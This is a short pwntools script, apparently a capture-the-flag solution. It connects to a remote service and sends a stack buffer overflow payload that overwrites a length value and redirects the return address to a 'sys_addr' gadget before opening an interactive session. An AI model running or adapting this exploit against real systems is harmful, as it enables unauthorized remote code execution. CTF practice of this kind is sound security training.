from pwn import *

# r = process('./stack')
r = remote("43.249.195.138", 21604)
sys_addr = 0x4012ee

r.recvuntil(b": ")
r.sendline(b"100")
r.recvuntil(b">")
payload = b"a" * (0x20 - 0x04) + p32(0x24) + p64(sys_addr)
# pause()
r.sendline(payload)
r.interactive()